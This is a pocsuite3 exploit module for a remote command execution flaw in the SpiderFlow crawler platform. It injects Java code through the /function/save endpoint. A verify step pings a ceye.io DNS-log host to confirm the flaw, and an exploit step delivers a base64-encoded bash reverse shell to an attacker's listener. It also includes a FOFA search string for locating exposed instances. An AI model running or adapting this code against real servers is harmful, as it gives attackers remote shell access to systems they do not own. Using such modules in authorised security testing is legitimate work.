"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, CEye
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text, random_str

class DemoPOC(POCBase):
    vulID = '10'  
    author = ['PeiQi']
    name = 'SpiderFlow save 远程命令执行漏洞'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''SpiderFlow 平台以流程图的⽅式定义爬⾍,是⼀个⾼度灵活可配置的爬⾍平台,官⽹:https://www.spiderflow.org/'''
    appPowerLink = 'https://www.spiderflow.org/'
    appName = 'SpiderFlow'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'title="SpiderFlow"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "bash": REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()),
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _verify(self):
        result = {}
        random_uri = random_str(8)
        ceye_dnslog = CEye()
        dnslog_url = ceye_dnslog.build_request(value=random_uri, type="dns")["url"]
        url = self.url.rstrip('/') + "/function/save"
        data = "id=&name=cmd&parameter=cmd&script=}Java.type('java.lang.Runtime').getRuntime().exec('ping -c 2 " + dnslog_url + "');{"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "token": "admin"
        }
        try:
            _ = requests.post(url, data=data, headers=headers, timeout=5)
            resp_dnslog = ceye_dnslog.verify_request(flag=str.lower(random_uri), type="dns")
            if resp_dnslog:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Cmd'] = "ping -c 2 " + dnslog_url
                result['VerifyInfo']['DnsVerify'] = "http://api.ceye.io/v1/records?token=" + ceye_dnslog.token + "&type=dns&filter=" + str.lower(random_uri) 
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _shell(self):
        cmd = self.get_option("payload")
        self._exploit(cmd)
    
    def _exploit(self, cmd):
        result = {}
        cmd = "bash -c {echo," + base64.b64encode(cmd.encode('utf-8')).decode('utf-8') + "}|{base64,-d}|{bash,-i}"
        url = self.url.rstrip('/') + "/function/save"
        data = "id=&name=cmd&parameter=cmd&script=}Java.type('java.lang.Runtime').getRuntime().exec('" + cmd + "');{"
        print(data)
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "token": "admin"
        }
        try:
            _ = requests.post(url, data=data, headers=headers, timeout=5)
        except Exception as ex:
            pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
